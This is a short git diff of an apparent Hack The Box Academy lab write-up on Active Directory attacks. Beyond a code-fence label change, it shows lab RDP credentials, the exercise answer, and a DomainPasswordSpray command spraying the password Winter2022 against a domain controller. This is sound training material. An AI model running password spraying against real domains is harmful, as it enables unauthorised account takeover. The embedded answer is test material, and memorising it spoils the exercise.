@@ -60,7 +60,7 @@ RDP to **10.129.35.30** (ACADEMY-EA-MS01), with user `htb-student` and password 
 1. Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer. **Answer: dbranch**
    - `$ xfreerdp /v:10.129.35.30 /u:htb-student /p:Academy_student_AD!` → RDP to the target machine
    - Use the DomainPasswordSpray tool to automatically create a user list and perform password spraying on the Domain Controller, since we are authenticated to a domain:
-        ```sh
+        ```shellsession
         PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
         PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
         [*] Current domain is compatible with Fine-Grained Password Policy.
